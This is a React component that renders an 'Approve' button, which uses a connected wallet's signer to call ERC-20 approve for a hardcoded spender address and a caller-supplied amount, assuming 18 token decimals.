import { useWallet } from "@thirdweb-dev/react";
import { ethers } from "ethers";
import React from "react";

const ApproveButton = ({ tokenAddress, amount }) => {
    // Validation to ensure required props are provided
    const auth = useWallet();
    const spender = '0x9900c7EFeefCad12508F39EC1fcDd88E33E9d766';
    if ( !tokenAddress || !amount) {
        console.error("ApproveButton: Missing required props.");
        return null;
    }



    // Function to handle the approval process
    const handleApprove = async (e) => {
        try {
          
            e.preventDefault();
            console.log("Starting approval process...");

            // Ensure the client provides a signer
            const signer = await auth.getSigner();
            if (!signer) throw new Error("No signer available.");

            // ERC-20 ABI for the approve function
            const erc20Abi = [
                "function approve(address spender, uint256 amount) public returns (bool)",
            ];

            // Connect to the token contract
            const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);

            // Parse the amount to correct decimals
            const formattedAmount = ethers.utils.parseUnits(amount.toString(), 18);

            // Call the approve function
            const tx = await contract.approve(spender, formattedAmount);
            console.log("Approval transaction submitted:", tx);

            // Wait for the transaction to be mined
            await tx.wait();
            console.log("Approval successful!");

            alert("Tokens approved successfully!");
        } catch (error) {
            console.error("Error during approval process:", error);
            alert("Approval failed! Please check the console for details.");
        }
    };

    return (
        <button
            // contractAddress={tokenAddress}
            onClick={handleApprove}
            type="submit"
            className="w-100"
            style={{
                padding: "1rem",
                fontSize: "1.5rem",
                backgroundColor: "#F26E01", // Mango orange
                borderColor: "#FFA500", // Match the border color
                color: "#FFFFFF", // White text for contrast
            }}
        >
            Approve
        </button>

    );
};
export default ApproveButton;